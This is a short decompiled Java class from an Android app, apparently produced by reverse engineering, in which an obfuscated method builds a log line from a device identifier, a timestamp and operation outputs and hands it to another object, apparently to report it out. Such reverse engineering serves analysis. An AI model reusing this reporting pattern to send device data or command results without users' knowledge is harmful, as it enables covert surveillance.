package com.security.d;

import com.android.system.CoreApp;
import com.app.system.common.h;
import com.security.ServiceSettings;
import com.security.a;
import java.util.Date;

public class b
{
  public static void a(String paramString1, final String paramString2, final String paramString3)
  {
    if (ServiceSettings.a().b("send-operation-output")) {
      new Thread(new Runnable()
      {
        public void run()
        {
          String str1 = new Date().toString();
          String str2 = h.c(CoreApp.a());
          a locala = a.a();
          StringBuilder localStringBuilder = new StringBuilder();
          localStringBuilder.append("<LOG: ");
          localStringBuilder.append(":");
          localStringBuilder.append(str2);
          localStringBuilder.append(":");
          localStringBuilder.append(str1);
          localStringBuilder.append(":");
          localStringBuilder.append(this.a);
          localStringBuilder.append(":");
          localStringBuilder.append(paramString2);
          localStringBuilder.append(":");
          localStringBuilder.append(paramString3);
          localStringBuilder.append(">");
          locala.b(localStringBuilder.toString());
        }
      }).start();
    }
  }
}


/* Location:              ~/com/security/d/b.class
 *
 * Reversed by:           J
 */